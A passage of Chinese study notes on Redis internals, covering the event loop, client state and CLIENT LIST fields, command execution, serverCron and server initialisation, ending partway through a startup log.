timeval结构为参数，并在指定的时间內，阻塞并等待所有被aeCreateFileEvent函数设置为监听状态的套接字产生文件事件，当有至少一个事件产生，或者等待超时后，函数返回。ae.c&#x2F;aeProcessEvents函数是文件事件分派器，它先调用aeApiPoll函数来等待事件产生，然后遍历所有已产生的事件，并调用相应的事件处理器来处理这些事件。ae.c&#x2F;aeGetApiName函数返回I&#x2F;O多路复用程序底层所使用的I&#x2F;O多路复用函数库的名称：返回”epoll”表示底层为epoll函数库，返回”select”表示底层为select函数库，诸如此类。\n文件事件的处理器Redis为文件事件编写了多个处理器，这些事件处理器分别用于实现不同的网络通信需求，比如说：\n\n为了对连接服务器的各个客户端进行应答，服务器要为监听套接字关联连接应答处理器。\n为了接收客户端传来的命令请求，服务器要为客户端套接字关联命令请求处理器。\n为了向客户端返回命令的执行结果，服务器要为客户端套接字关联命令回复处理器。\n当主服务器和从服务器进行复制操作时，主从服务器都需要关联特别为复制功能编写的复制处理器。\n\n在这些事件处理器里面，服务器最常用的要数与客户端进行通信的连接应答处理器、命令请求处理器和命令回复处理器。\n连接应答处理器networking.c&#x2F;acceptTcpHandler函数是Redis的连接应答处理器，这个处理器用于对连接服务器监听套接字的客户端进行应答，具体实现为sys&#x2F;socket.h&#x2F;accept函数的包装。当Redis服务器进行初始化的时候，程序会将这个连接应答处理器和服务器监听套接字的AE_READABLE事件关联起来，当有客户端用sys&#x2F;socket.h&#x2F;connect函数连接服务器监听套接字的时候，套接字就会产生AE_READABLE事件，引发连接应答处理器执行，并执行相应的套接字应答操作。\n命令请求处理器networking.c&#x2F;readQueryFromClient函数是Redis的命令请求处理器，这个处理器负责从套接字中读入客户端发送的命令请求内容，具体实现为unistd.h&#x2F;read函数的包装。当一个客户端通过连接应答处理器成功连接到服务器之后，服务器会将客户端套接字的AE_READABLE事件和命令请求处理器关联起来，当客户端向服务器发送命令请求的时候，套接字就会产生AE_READABLE事件，引发命令请求处理器执行，并执行相应的套接字读入操作。\n命令回复处理器networking.c&#x2F;sendReplyToClient函数是Redis的命令回复处理器，这个处理器负责将服务器执行命令后得到的命令回复通过套接字返回给客户端，具体实现为unistd.h&#x2F;write函数的包装。当服务器有命令回复需要传送给客户端的时候，服务器会将客户端套接字的AE_WRITABLE事件和命令回复处理器关联起来，当客户端准备好接收服务器传回的命令回复时，就会产生AE_WRITABLE事件，引发命令回复处理器执行，并执行相应的套接字写入操作。\n\n时间事件Redis的时间事件分为以下两类：\n\n定时事件：让一段程序在指定的时间之后执行一次。比如说，让程序X在当前时间的30毫秒之后执行一次。\n周期性事件：让一段程序每隔指定时间就执行一次。比如说，让程序Y每隔30毫秒就执行一次。\n\n一个时间事件主要由以下三个属性组成：\n\nid：服务器为时间事件创建的全局唯一ID（标识号）。ID号按从小到大的顺序递增，新事件的ID号比旧事件的ID号要大。\nwhen：毫秒精度的UNIX时间戳，记录了时间事件的到达（arrive）时间。\ntimeProc：时间事件处理器，一个函数。当时间事件到达时，服务器就会调用相应的处理器来处理事件。\n\n一个时间事件是定时事件还是周期性事件取决于时间事件处理器的返回值：\n\n如果事件处理器返回ae.h&#x2F;AE_NOMORE，那么这个事件为定时事件：该事件在达到一次之后就会被删除，之后不再到达。\n如果事件处理器返回一个非AE_NOMORE的整数值，那么这个事件为周期性时间：当一个时间事件到达之后，服务器会根据事件处理器返回的值，对时间事件的when属性进行更新，让这个事件在一段时间之后再次到达，并以这种方式一直更新并运行下去。比如说，如果一个时间事件的处理器返回整数值30，那么服务器应该对这个时间事件进行更新，让这个事件在30毫秒之后再次到达。\n\n实现服务器将所有时间事件都放在一个无序链表中，每当时间事件执行器运行时，它就遍历整个链表，查找所有已到达的时间事件，并调用相应的事件处理器。\n\n这里说保存时间事件的链表为无序链表，指的不是链表不按ID排序，而是说，该链表不按when属性的大小排序。正因为链表没有按when属性进行排序，所以当时间事件执行器运行的时候，它必须遍历链表中的所有时间事件，这样才能确保服务器中所有已到达的时间事件都会被处理。无序链表并不影响时间事件处理器的性能\n\nAPIae.c&#x2F;aeCreateTimeEvent函数接受一个毫秒数milliseconds和一个时间事件处理器proc作为参数。将一个新的时间事件添加到服务器，这个新的时间事件将在当前时间的milliseconds毫秒之后到达，而事件的处理器为proc。\nae.c&#x2F;aeDeleteFileEvent函数接受一个时间事件ID作为参数，然后从服务器中删除该ID所对应的时间事件。\nae.c&#x2F;aeSearchNearestTimer函数返回到达时间距离当前时间最接近的那个时间事件。\nae.c&#x2F;processTimeEvents函数是时间事件的执行器，这个函数会遍历所有已到达的时间事件，并调用这些事件的处理器。已到达指的是，时间事件的when属性记录的UNIX时间戳等于或小于当前时间的UNIX时间戳。\n时间事件应用实例：serverCron函数持续运行的Redis服务器需要定期对自身的资源和状态进行检查和调整，从而确保服务器可以长期、稳定地运行，这些定期操作由redis.c&#x2F;serverCron函数负责执行，它的主要工作包括：\n\n更新服务器的各类统计信息，比如时间、内存占用、数据库占用情况等。\n清理数据库中的过期键值对。\n关闭和清理连接失效的客户端。\n尝试进行AOF或RDB持久化操作。\n如果服务器是主服务器，那么对从服务器进行定期同步。\n如果处于集群模式，对集群进行定期同步和连接测试。\n\nRedis服务器以周期性事件的方式来运行serverCron函数，在服务器运行期间，每隔一段时间，serverCron就会执行一次，直到服务器关闭为止。\n在Redis2.6版本，服务器默认规定serverCron每秒运行10次，平均每间隔100毫秒运行一次。从Redis2.8开始，用户可以通过修改hz选项来调整serverCron的每秒执行次数，具体信息请参考示例配置文件redis.conf关于hz选项的说明。\n事件的调度与执行因为服务器中同时存在文件事件和时间事件两种事件类型，所以服务器必须对这两种事件进行调度，决定何时应该处理文件事件，何时又应该处理时间事件，以及花多少时间来处理它们等等。\n事件的调度和执行由ae.c&#x2F;aeProcessEvents函数负责，以下是该函数的伪代码表示：\ndef aeProcessEvents():    # 获取到达时间离当前时间最接近的时间事件    time_event = aeSearchNearestTimer()    # 计算最接近的时间事件距离到达还有多少毫秒    remaind_ms = time_event.when - unix_ts_now()    # 如果事件已到达，那么remaind_ms的值可能为负数，将它设定为0    if remaind_ms &lt; 0:        remaind_ms = 0    # 根据remaind_ms的值，创建timeval结构    timeval = create_timeval_with_ms(remaind_ms)    # 阻塞并等待文件事件产生，最大阻塞时间由传入的timeval结构决定    # 如果remaind_ms的值为0，那么aeApiPoll调用之后马上返回，不阻塞    aeApiPoll(timeval)    # 处理所有已产生的文件事件    processFileEvents()    # 处理所有已到达的时间事件    processTimeEvents()\n\n前面在介绍文件事件API的时候，并没有讲到processFileEvents这个函数，因为它并不存在，在实际中，处理已产生文件事件的代码是直接写在aeProcessEvents函数里面的，这里为了方便讲述，才虚构了processFileEvents函数。\n将aeProcessEvents函数置于一个循环里面，加上初始化和清理函数，这就构成了Redis服务器的主函数：\ndef main():    # 初始化服务器    init_server()    # 一直处理事件，直到服务器关闭为止    while server_is_not_shutdown():        aeProcessEvents()    # 服务器关闭，执行清理操作    clean_server()\n\n以下是事件的调度和执行规则：\n\naeApiPoll函数的最大阻塞时间由到达时间最接近当前时间的时间事件决定，这个方法既可以避免服务器对时间事件进行频繁的轮询（忙等待），也可以确保aeApiPoll函数不会阻塞过长时间。\n因为文件事件是随机出现的，如果等待并处理完一次文件事件之后，仍未有任何时间事件到达，那么服务器将再次等待并处理文件事件。随着文件事件的不断执行，时间会逐渐向时间事件所设置的到达时间逼近，并最终来到到达时间，这时服务器就可以开始处理到达的时间事件了。\n对文件事件和时间事件的处理都是同步、有序、原子地执行的，服务器不会中途中断事件处理，也不会对事件进行抢占，因此，不管是文件事件的处理器，还是时间事件的处理器，它们都会尽可地减少程序的阻塞时间，并在有需要时主动让出执行权，从而降低造成事件饥饿的可能性。比如说，在命令回复处理器将一个命令回复写入到客户端套接字时，如果写入字节数超过了一个预设常量的话，命令回复处理器就会主动用break跳出写入循环，将余下的数据留到下次再写；另外，时间事件也会将非常耗时的持久化操作放到子线程或者子进程执行。\n因为时间事件在文件事件之后执行，并且事件之间不会出现抢占，所以时间事件的实际处理时间，通常会比时间事件设定的到达时间稍晚一些。\n\n第十三章 - 客户端Redis服务器是典型的一对多服务器程序：一个服务器可以与多个客户端建立网络连接，每个客户端可以向服务器发送命令请求，而服务器则接收并处理客户端发送的命令请求，并向客户端返回命令回复。通过使用由I&#x2F;O多路复用技术实现的文件事件处理器，Redis服务器使用单线程单进程的方式来处理命令请求，并与多个客户端进行网络通信。\n对于每个与服务器进行连接的客户端，服务器都为这些客户端建立了相应的redis.h&#x2F;redisClient结构（客户端状态），这个结构保存了客户端当前的状态信息，以及执行相关功能时需要用到的数据结构，其中包括：\n\n客户端的套接字描述符。\n客户端的名字。\n客户端的标志值（flag）。\n指向客户端正在使用的数据库的指针，以及该数据库的号码。\n客户端当前要执行的命令、命令的参数、命令参数的个数，以及指向命令实现函数的指针。\n客户端的输入缓冲区和输出缓冲区。\n客户端的复制状态信息，以及进行复制所需的数据结构。\n客户端执行BRPOP、BLPOP等列表阻塞命令时使用的数据结构。\n客户端的事务状态，以及执行WATCH命令时用到的数据结构。\n客户端执行发布与订阅功能时用到的数据结构。\n客户端的身份验证标志。\n客户端的创建时间，客户端和服务器最后一次通信的时间，以及客户端的输出缓冲区大小超出软性限制（soft limit）的时间。\n\nRedis服务器状态结构的clients属性是一个链表，这个链表保存了所有与服务器连接的客户端的状态结构，对客户端执行批量操作，或者查找某个指定的客户端，都可以通过遍历clients链表来完成：\nstruct redisServer &#123;    // ...    // 一个链表，保存了所有客户端状态    list *clients;    // ...&#125;;\n\n客户端属性客户端状态包含的属性可以分为两类：\n\n一类是比较通用的属性，这些属性很少与特定功能相关，无论客户端执行的是什么工作，它们都要用到这些属性。\n另外一类是和特定功能相关的属性，比如操作数据库时需要用到的db属性和dictid属性，执行事务时需要用到的mstate属性，以及执行WATCH命令时需要用到的watched_keys属性等等。\n\n执行CLIENT list命令可以列出目前所有连接到服务器的普通客户端：\nredis&gt; CLIENT listid=3 addr=172.17.0.1:47759 laddr=172.17.0.2:6379 fd=11 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 ssub=0 multi=-1 watch=0 qbuf=26 qbuf-free=20448 argv-mem=10 multi-mem=0 rbs=1024 rbp=673 obl=0 oll=0 omem=0 tot-mem=22426 events=r cmd=client|list user=default redir=-1 resp=2 lib-name=jedis lib-ver=4.4.3\n\n\nid: 客户端的唯一标识符。\naddr: 客户端的 IP 地址和端口号。\nladdr: Redis 服务器本地的 IP 地址和端口号，用于此连接。\nfd: 客户端连接的文件描述符。\nname: 客户端名称，默认空白，可通过 CLIENT SETNAME 设置。\nage: 该连接的持续时间（以秒为单位）。\nidle: 客户端自上次发出命令后空闲的时间（以秒为单位）。\nflags: 客户端的标志位。这里的 N 表示普通客户端，未设置特殊标志。\ndb: 客户端正在使用的数据库编号。\nsub: 该客户端的频道订阅数量。\npsub: 该客户端的模式订阅数量（订阅模式匹配的通配符频道）。\nssub: 共享订阅数量，用于集群环境下的连接共享。\nmulti: 当前事务队列中的命令数量。如果客户端未使用事务，则显示为 -1。\nwatch: 客户端监视的键的数量（事务监视机制）。\nqbuf: 查询缓冲区的当前长度（字节数）。\nqbuf-free: 查询缓冲区的空闲空间（字节数）。\nargv-mem: 命令参数占用的内存量（字节数）。\nmulti-mem: 事务命令队列所占用的内存量（字节数）。\nrbs: 该客户端的复制缓冲区大小。\nrbp: 复制缓冲区中的偏移量。\nobl: 输出缓冲区的长度。\noll: 输出缓冲区的链表长度。\nomem: 输出缓冲区占用的内存量。\ntot-mem: 客户端连接总占用的内存量。\nevents: 事件标志，r 表示客户端可读。\ncmd: 客户端最后执行的命令。\nuser: 客户端认证的用户名（这里为 default）。\nredir: 当前客户端重定向的目标（-1 表示未重定向）。\nresp: 客户端使用的 RESP 协议版本。\nlib-name: 客户端连接库的名称（例如 jedis）。\nlib-ver: 客户端库的版本（例如 4.4.3）。\n\n下面就不放书中所列举的各属性的含义了，只取部分解释，因为书中使用的Redis版本较老，部分已经更改或弃用了。需要最新的还是得看官方文档（很全）。\n其中，客户端标识 flags 可以是以下组合：\nA: connection to be closed ASAPb: the client is waiting in a blocking operationc: connection to be closed after writing entire replyd: a watched keys has been modified - EXEC will faile: the client is excluded from the client eviction mechanismi: the client is waiting for a VM I/O (deprecated)M: the client is a masterN: no specific flag setO: the client is a client in MONITOR modeP: the client is a Pub/Sub subscriberr: the client is in readonly mode against a cluster nodeS: the client is a replica node connection to this instanceu: the client is unblockedU: the client is connected via a Unix domain socketx: the client is in a MULTI/EXEC contextt: the client enabled keys tracking in order to perform client side cachingT: the client will not touch the LRU/LFU of the keys it accessesR: the client tracking target client is invalidB: the client enabled broadcast tracking mode \n\nPUBSUB命令和SCRIPT LOAD命令的特殊性通常情况下，Redis只会将那些对数据库进行了修改的命令写入到AOF文件，并复制到各个从服务器。如果一个命令没有对数据库进行任何修改，那么它就会被认为是只读命令，这个命令不会被写入到AOF文件，也不会被复制到从服务器。\n以上规则适用于绝大部分Redis命令，但PUBSUB命令和SCRIPT LOAD命令是其中的例外。PUBSUB命令虽然没有修改数据库，但PUBSUB命令向频道的所有订阅者发送消息这一行为带有副作用，接收到消息的所有客户端的状态都会因为这个命令而改变。因此，在早期版本服务器需要使用REDIS_FORCE_AOF标志，强制将这个命令写入AOF文件，这样在将来载入AOF文件时，服务器就可以再次执行相同的PUBSUB命令，并产生相同的副作用。SCRIPT LOAD命令的情况与PUBSUB命令类似：虽然SCRIPT LOAD命令没有修改数据库，但它修改了服务器状态，所以它是一个带有副作用的命令，服务器需要使用REDIS_FORCE_AOF标志，强制将这个命令写入AOF文件，使得将来在载入AOF文件时，服务器可以产生相同的副作用。另外，为了让主服务器和从服务器都可以正确地载入SCRIPT LOAD命令指定的脚本，服务器需要使用REDIS_FORCE_REPL标志，强制将SCRIPT LOAD命令复制给所有从服务器。\n关于Redis主从复制可以参考这几篇文章：Redis replicationRedis主从同步原理、及SYNC和PSYNC同步区别Redis:发布订阅(pub&#x2F;sub)的实现原理及避坑场景\n客户端的创建与关闭服务器使用不同的方式来创建和关闭不同类型的客户端。\n创建普通客户端如果客户端是通过网络连接与服务器进行连接的普通客户端，那么在客户端使用connect函数连接到服务器时，服务器就会调用连接事件处理器，为客户端创建相应的客户端状态，并将这个新的客户端状态添加到服务器状态结构clients链表的末尾。\n关闭普通客户端一个普通客户端可以因为多种原因而被关闭：\n\n如果客户端进程退出或者被杀死，那么客户端与服务器之间的网络连接将被关闭，从而造成客户端被关闭。\n如果客户端向服务器发送了带有不符合协议格式的命令请求，那么这个客户端也会被服务器关闭。\n如果客户端成为了CLIENT KILL命令的目标，那么它也会被关闭。\n如果用户为服务器设置了timeout配置选项，那么当客户端的空转时间超过timeout选项设置的值时，客户端将被关闭。不过timeout选项有一些例外情况：如果客户端是主服务器（打开了REDIS_MASTER标志），从服务器（打开了REDIS_SLAVE标志），正在被BLPOP等命令阻塞（打开了REDIS_BLOCKED标志），或者正在执行SUBSCRIBE、PSUBSCRIBE等订阅命令，那么即使客户端的空转时间超过了timeout选项的值，客户端也不会被服务器关闭。\n如果客户端发送的命令请求的大小超过了输入缓冲区的限制大小（默认为1 GB），那么这个客户端会被服务器关闭。\n如果要发送给客户端的命令回复的大小超过了输出缓冲区的限制大小，那么这个客户端会被服务器关闭。\n\n前面介绍输出缓冲区的时候提到过，可变大小缓冲区由一个链表和任意多个字符串对象组成，理论上来说，这个缓冲区可以保存任意长的命令回复。但是，为了避免客户端的回复过大，占用过多的服务器资源，服务器会时刻检查客户端的输出缓冲区的大小，并在缓冲区的大小超出范围时，执行相应的限制操作。\n服务器使用两种模式来限制客户端输出缓冲区的大小：\n\n硬性限制（hard limit）：如果输出缓冲区的大小超过了硬性限制所设置的大小，那么服务器立即关闭客户端。\n软性限制（soft limit）：如果输出缓冲区的大小超过了软性限制所设置的大小，但还没超过硬性限制，那么服务器将使用客户端状态结构的obuf_soft_limit_reached_time属性记录下客户端到达软性限制的起始时间；之后服务器会继续监视客户端，如果输出缓冲区的大小一直超出软性限制，并且持续时间超过服务器设定的时长，那么服务器将关闭客户端；相反地，如果输出缓冲区的大小在指定时间之内，不再超出软性限制，那么客户端就不会被关闭，并且obuf_soft_limit_reached_time属性的值也会被清零。\n\n使用client-output-buffer-limit选项可以为普通客户端、从服务器客户端、执行发布与订阅功能的客户端分别设置不同的软性限制和硬性限制。client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;\nLua脚本的伪客户端服务器会在初始化时创建负责执行Lua脚本中包含的Redis命令的伪客户端，并将这个伪客户端关联在服务器状态结构的lua_client属性中：\nstruct redisServer &#123;    // ...    redisClient *lua_client;    // ...&#125;;\n\nlua_client伪客户端在服务器运行的整个生命期中会一直存在，只有服务器被关闭时，这个客户端才会被关闭。\nAOF文件的伪客户端服务器在载入AOF文件时，会创建用于执行AOF文件包含的Redis命令的伪客户端，并在载入完成之后，关闭这个伪客户端。\n第十四章 - 服务器Redis服务器负责与多个客户端建立网络连接，处理客户端发送的命令请求，在数据库中保存客户端执行命令所产生的数据，并通过资源管理来维持服务器自身的运转。\n命令请求的执行过程从客户端发送SET KEY VALUE命令到获得回复OK期间，客户端和服务器共需要执行以下操作：\n\n客户端向服务器发送命令请求SET KEY VALUE。Redis服务器的命令请求来自Redis客户端，当用户在客户端中键入一个命令请求时，客户端会将这个命令请求转换成协议格式，然后通过连接到服务器的套接字，将协议格式的命令请求发送给服务器。\n服务器接收并处理客户端发来的命令请求SET KEY VALUE，在数据库中进行设置操作，并产生命令回复OK。当客户端与服务器之间的连接套接字因为客户端的写入而变得可读时，服务器将调用命令请求处理器来执行以下操作：\n读取套接字中协议格式的命令请求，并将其保存到客户端状态的输入缓冲区里面。\n对输入缓冲区中的命令请求进行分析，提取出命令请求中包含的命令参数，以及命令参数的个数，然后分别将参数和参数个数保存到客户端状态的argv属性和argc属性里面。\n调用命令执行器，执行客户端指定的命令。\n命令执行器（1）：查找命令实现命令执行器要做的第一件事就是根据客户端状态的argv[0]参数，在命令表（command table）中查找参数所指定的命令，并将找到的命令保存到客户端状态的cmd属性里面。命令表是一个字典，字典的键是一个个命令名字，比如”set”、”get”、”del”等等；而字典的值则是一个个redisCommand结构，每个redisCommand结构记录了一个Redis命令的实现信息。\n命令执行器（2）：执行预备操作到目前为止，服务器已经将执行命令所需的命令实现函数（保存在客户端状态的cmd属性）、参数（保存在客户端状态的argv属性）、参数个数（保存在客户端状态的argc属性）都收集齐了，但是在真正执行命令之前，程序还需要进行一些预备操作，从而确保命令可以正确、顺利地被执行，这些操作包括：\n检查客户端状态的cmd指针是否指向NULL，如果是的话，那么说明用户输入的命令名字找不到相应的命令实现，服务器不再执行后续步骤，并向客户端返回一个错误。\n根据客户端cmd属性指向的redisCommand结构的arity属性，检查命令请求所给定的参数个数是否正确，当参数个数不正确时，不再执行后续步骤，直接向客户端返回一个错误。比如说，如果redisCommand结构的arity属性的值为-3，那么用户输入的命令参数个数必须大于等于3个才行。\n检查客户端是否已经通过了身份验证，未通过身份验证的客户端只能执行AUTH命令，如果未通过身份验证的客户端试图执行除AUTH命令之外的其他命令，那么服务器将向客户端返回一个错误。\n如果服务器打开了maxmemory功能，那么在执行命令之前，先检查服务器的内存占用情况，并在有需要时进行内存回收，从而使得接下来的命令可以顺利执行。如果内存回收失败，那么不再执行后续步骤，向客户端返回一个错误。\n如果服务器上一次执行BGSAVE命令时出错，并且服务器打开了stop-writes-on-bgsave-error功能，而且服务器即将要执行的命令是一个写命令，那么服务器将拒绝执行这个命令，并向客户端返回一个错误。\n如果客户端当前正在用SUBSCRIBE命令订阅频道，或者正在用PSUBSCRIBE命令订阅模式，那么服务器只会执行客户端发来的SUBSCRIBE、PSUBSCRIBE、UNSUBSCRIBE、PUNSUBSCRIBE四个命令，其他命令都会被服务器拒绝。\n如果服务器正在进行数据载入，那么客户端发送的命令必须带有l标识（比如INFO、SHUTDOWN、PUBLISH等等）才会被服务器执行，其他命令都会被服务器拒绝。\n如果服务器因为执行Lua脚本而超时并进入阻塞状态，那么服务器只会执行客户端发来的SHUTDOWN nosave命令和SCRIPT KILL命令，其他命令都会被服务器拒绝。\n如果客户端正在执行事务，那么服务器只会执行客户端发来的EXEC、DISCARD、MULTI、WATCH四个命令，其他命令都会被放进事务队列中。\n如果服务器打开了监视器功能，那么服务器会将要执行的命令和参数等信息发送给监视器。当完成了以上预备操作之后，服务器就可以开始真正执行命令了。\n\n\n命令执行器（3）：调用命令的实现函数服务器已经将要执行命令的实现保存到了客户端状态的cmd属性里面，并将命令的参数和参数个数分别保存到了客户端状态的argv属性和argv属性里面，当服务器决定要执行命令时，只需要调用cmd指针的proc(client)函数即可。因为执行命令所需的实际参数都已经保存到客户端状态的argv属性里面了，所以命令的实现函数只需要一个指向客户端状态的指针作为参数即可。被调用的命令实现函数会执行指定的操作，并产生相应的命令回复，这些回复会被保存在客户端状态的输出缓冲区里面（buf属性和reply属性），之后实现函数还会为客户端的套接字关联命令回复处理器，这个处理器负责将命令回复返回给客户端。对于前面SET命令的例子来说，函数调用setCommand（client）将产生一个”+OK\\r\\n”回复，这个回复会被保存到客户端状态的buf属性里面。\n命令执行器（4）：执行后续工作在执行完实现函数之后，服务器还需要执行一些后续工作：\n如果服务器开启了慢查询日志功能，那么慢查询日志模块会检查是否需要为刚刚执行完的命令请求添加一条新的慢查询日志。\n根据刚刚执行命令所耗费的时长，更新被执行命令的redisCommand结构的milliseconds属性，并将命令的redisCommand结构的calls计数器的值增一。\n如果服务器开启了AOF持久化功能，那么AOF持久化模块会将刚刚执行的命令请求写入到AOF缓冲区里面。\n如果有其他从服务器正在复制当前这个服务器，那么服务器会将刚刚执行的命令传播给所有从服务器。\n\n\n\n\n\n\n将命令回复发送给客户端。命令实现函数会将命令回复保存到客户端的输出缓冲区里面，并为客户端的套接字关联命令回复处理器，当客户端套接字变为可写状态时，服务器就会执行命令回复处理器，将保存在客户端输出缓冲区中的命令回复发送给客户端。\n客户端接收并打印命令回复。当客户端接收到协议格式的命令回复之后，它会将这些回复转换成人类可读的格式，并打印给用户观看（假设我们使用的是Redis自带的redis-cli客户端。\n\nserverCron函数Redis服务器中的serverCron函数默认每隔100毫秒执行一次，这个函数负责管理服务器的资源，并保持服务器自身的良好运转。\nserverCron 是 Redis 的核心函数之一，它负责定期执行一系列后台任务来确保 Redis 服务器的正常运行。这个函数通常每 100 毫秒执行一次，由 Redis 的事件处理机制触发。它在 Redis 的主事件循环中扮演着关键角色。serverCron 函数的设计目标是将服务器的维护任务和客户请求的处理分开，并通过定时任务来管理服务器的内部状态。\na) 客户端超时管理 (clientTimeout)\n\nRedis 会检查每个客户端的空闲时间 (idle)，如果客户端空闲超过指定的超时时间（通常是 0 表示不限制），则关闭这些连接，释放资源。这可以防止大量的空闲连接消耗内存和资源。\n例如，Redis 会定期扫描所有客户端，关闭超时的连接。客户端的状态被记录在 client 结构体中，包括它的活动时间等。\n\nb) 过期键处理\n\nRedis 通过扫描数据库中的键来检查和删除过期的键。serverCron 会定期触发过期键的清理操作，尤其是检查那些通过 EXPIRE 设置了过期时间的键。\nRedis 采用两种过期处理方式：\n惰性删除：每次访问键时检查是否过期，如果过期则删除。\n定期删除：定期触发 serverCron 扫描所有数据库，删除过期的键。\n\n\n\nc) 主从复制管理\n\nserverCron 还会管理主从复制的相关操作，如检查主服务器与从服务器的状态、处理复制偏移量等。若发生故障，它也会发起故障切换操作。\n在哨兵模式下，它还负责与哨兵协调，检查主节点是否宕机，是否需要执行故障转移。\n\nd) 内存管理\n\nRedis 允许配置内存限制，当 Redis 使用的内存超过限制时，它会尝试执行内存回收操作。serverCron 会定期触发内存逐出操作（如 LRU，LFU 策略）。\n它会定期检查当前的内存使用情况，并触发后台的内存清理过程，按照配置的逐出策略删除不再需要的键。\n\ne) AOF 和 RDB 持久化\n\nserverCron 还负责触发 AOF 文件的同步、AOF 重写（如果开启了 appendonly 配置）和 RDB 快照保存（如果开启了 save 配置）。\n在每次 serverCron 执行时，它会检查是否需要进行 AOF 和 RDB 的操作。例如，如果上次 AOF 重写时间间隔太长，或是内存达到一定阈值时，可能会触发 AOF 文件的重写操作。\n\nf) 集群维护\n\n在 Redis 集群模式下，serverCron 会定期检查集群节点的状态。它会周期性地向集群中的其他节点发送心跳检测请求，确保节点间的连接是活跃的。\n在集群环境下，serverCron 也负责检查各节点的分片数据，处理分片重分配等操作。\n\ng) 统计信息更新\n\n每次执行 serverCron 时，Redis 会更新一些运行时的统计信息，如内存使用情况、命令执行次数、客户端数量等。这些信息对运维监控和性能分析非常重要。\n\nh) Lua 脚本处理\n\nRedis 支持 Lua 脚本，serverCron 会检查当前正在执行的 Lua 脚本。如果脚本执行超时，它会中断脚本执行，并返回错误。\n\n初始化服务器一个Redis服务器从启动到能够接受客户端的命令请求，需要经过一系列的初始化和设置过程，比如初始化服务器状态，接受用户指定的服务器配置，创建相应的数据结构和网络连接等等。\n初始化服务器状态结构初始化服务器的第一步就是创建一个struct redisServer类型的实例变量server作为服务器的状态，并为结构中的各个属性设置默认值。初始化server变量的工作由redis.c&#x2F;initServerConfig函数完成\n以下是initServerConfig函数完成的主要工作：\n\n设置服务器的运行ID。\n设置服务器的默认运行频率。\n设置服务器的默认配置文件路径。\n设置服务器的运行架构。\n设置服务器的默认端口号。\n设置服务器的默认RDB持久化条件和AOF持久化条件。\n初始化服务器的LRU时钟。\n创建命令表。\n\n载入配置选项在启动服务器时，用户可以通过给定配置参数或者指定配置文件来修改服务器的默认配置。\n\n如果用户为这些属性的相应选项指定了新的值，那么服务器就使用用户指定的值来更新相应的属性。\n如果用户没有为属性的相应选项设置新的值，那么服务器就沿用之前initServerConfig函数为属性设置的默认值。\n\n初始化服务器数据结构在之前执行initServerConfig函数初始化server状态时，程序只创建了命令表一个数据结构，不过除了命令表之外，服务器状态还包含其他数据结构，比如：\n\nserver.clients链表，这个链表记录了所有与服务器相连的客户端的状态结构，链表的每个节点都包含了一个redisClient结构实例。\nserver.db数组，数组中包含了服务器的所有数据库。\n用于保存频道订阅信息的server.pubsub_channels字典，以及用于保存模式订阅信息的server.pubsub_patterns链表。\n用于执行Lua脚本的Lua环境server.lua。\n用于保存慢查询日志的server.slowlog属性。\n\n当初始化服务器进行到这一步，服务器将调用initServer函数，为以上提到的数据结构分配内存，并在有需要时，为这些数据结构设置或者关联初始化值。服务器到现在才初始化数据结构的原因在于，服务器必须先载入用户指定的配置选项，然后才能正确地对数据结构进行初始化。如果在执行initServerConfig函数时就对数据结构进行初始化，那么一旦用户通过配置选项修改了和数据结构有关的服务器状态属性，服务器就要重新调整和修改已创建的数据结构。为了避免出现这种麻烦的情况，服务器选择了将server状态的初始化分为两步进行，initServerConfig函数主要负责初始化一般属性，而initServer函数主要负责初始化数据结构。\n除了初始化数据结构之外，initServer还进行了一些非常重要的设置操作，其中包括：\n\n为服务器设置进程信号处理器。\n创建共享对象：这些对象包含Redis服务器经常用到的一些值，比如包含”OK”回复的字符串对象，包含”ERR”回复的字符串对象，包含整数1到10000的字符串对象等等，服务器通过重用这些共享对象来避免反复创建相同的对象。\n打开服务器的监听端口，并为监听套接字关联连接应答事件处理器，等待服务器正式运行时接受客户端的连接。\n为serverCron函数创建时间事件，等待服务器正式运行时执行serverCron函数。\n如果AOF持久化功能已经打开，那么打开现有的AOF文件，如果AOF文件不存在，那么创建并打开一个新的AOF文件，为AOF写入做好准备。\n初始化服务器的后台I&#x2F;O模块（bio），为将来的I&#x2F;O操作做好准备。\n\n当initServer函数执行完毕之后，服务器将用ASCII字符在日志中打印出Redis的图标，以及Redis的版本号信息。\n2024-11-13T01:58:13.881201049Z                 _._                                                  2024-11-13T01:58:13.881203185Z            _.-``__ &#x27;&#x27;-._                                             2024-11-13T01:58:13.881204638Z       _.-``    `.  `_.  &#x27;&#x27;-._           Redis Community Edition      2024-11-13T01:58:13.881205864Z   .-`` .-```.  ```\\/    _.,_ &#x27;&#x27;-._     7.4.1 (00000000/0) 64 bit2024-11-13T01:58:13.881207186Z  (    &#x27;      ,       .-`  | `,    )     Running in standalone mode2024-11-13T01:58:13.881208407Z  |`-._`-...-` __...-.``-._|&#x27;` _.-&#x27;|     Port: 63792024-11-13T01:58:13.881209585Z  |    `-._   `._    /     _.-&#x27;    |     PID: 12024-11-13T01:58:13.881210759Z   `-._    `-._  `-./  _.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881211947Z  |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  2024-11-13T01:58:13.881213124Z  |    `-._`-._        _.-&#x27;_.-&#x27;    |           https://redis.io       2024-11-13T01:58:13.881214326Z   `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881215484Z  |`-._`-._    `-.__.-&#x27;    _.-&#x27;_.-&#x27;|                                  2024-11-13T01:58:13.881216637Z  |    `-._`-._        _.-&#x27;_.-&#x27;    |                                  2024-11-13T01:58:13.881217812Z   `-._    `-._`-.__.-&#x27;_.-&#x27;    _.-&#x27;                                   2024-11-13T01:58:13.881218989Z       `-._    `-.__.-&#x27;    _.-&#x27;                                       2024-11-13T01:58:13.881220151Z           `-._        _.-&#x27;                                           2024-11-13T01:58:13.881221346Z               `-.__.-&#x27;                                               2024-11-13T01:58:13.881222564Z 2024-11-13T01:58:13.883108976Z 1:M 13 Nov 2024 01:58:13.883 * Server 